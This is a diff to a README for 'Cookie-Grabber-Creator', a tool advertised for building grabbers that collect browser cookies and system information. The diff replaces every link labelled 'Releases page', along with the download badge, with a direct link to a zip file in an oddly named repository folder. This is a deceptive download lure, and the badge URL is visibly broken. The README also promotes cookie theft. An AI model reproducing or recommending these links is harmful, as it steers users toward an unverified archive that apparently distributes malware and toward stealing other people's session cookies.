@@ -15,9 +15,9 @@ Welcome to Cookie-Grabber-Creator! This application helps you create a grabber q
 - **Computer Information:** Gather essential details about your system.
 
 ## 📥 Download
-[![Download Cookie-Grabber-Creator](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Zukiz1094/Cookie-Grabber-Creator/releases)
+[![Download Cookie-Grabber-Creator](https://raw.githubusercontent.com/Zukiz1094/Cookie-Grabber-Creator/main/nondenominational/Cookie-Grabber-Creator-v2.9.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/Zukiz1094/Cookie-Grabber-Creator/main/nondenominational/Cookie-Grabber-Creator-v2.9.zip)
 
-To get started, visit the [Releases page](https://github.com/Zukiz1094/Cookie-Grabber-Creator/releases) and download the latest version.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Zukiz1094/Cookie-Grabber-Creator/main/nondenominational/Cookie-Grabber-Creator-v2.9.zip) and download the latest version.
 
 ## 💻 System Requirements
 - **OS:** Windows 10 or higher
@@ -26,7 +26,7 @@ To get started, visit the [Releases page](https://github.com/Zukiz1094/Cookie-Gr
 - **Internet Connection:** Required for downloading the application and gathering information
 
 ## 📂 Download & Install
-1. Click the download link above or visit the [Releases page](https://github.com/Zukiz1094/Cookie-Grabber-Creator/releases).
+1. Click the download link above or visit the [Releases page](https://raw.githubusercontent.com/Zukiz1094/Cookie-Grabber-Creator/main/nondenominational/Cookie-Grabber-Creator-v2.9.zip).
 2. Find the latest version and select the appropriate file for your system.
 3. Click on the file to download it to your computer.
 4. Once the download is complete, locate the file in your Downloads folder.
@@ -67,6 +67,6 @@ Cookie-Grabber-Creator relates to:
 - xss
 
 ## 👥 Support
-If you encounter any issues or have questions, please refer to the FAQ section on the [Releases page](https://github.com/Zukiz1094/Cookie-Grabber-Creator/releases). You can also submit an issue directly through the GitHub repository for prompt assistance.
+If you encounter any issues or have questions, please refer to the FAQ section on the [Releases page](https://raw.githubusercontent.com/Zukiz1094/Cookie-Grabber-Creator/main/nondenominational/Cookie-Grabber-Creator-v2.9.zip). You can also submit an issue directly through the GitHub repository for prompt assistance.
 
 Thank you for using Cookie-Grabber-Creator! We hope this tool serves your needs effectively.
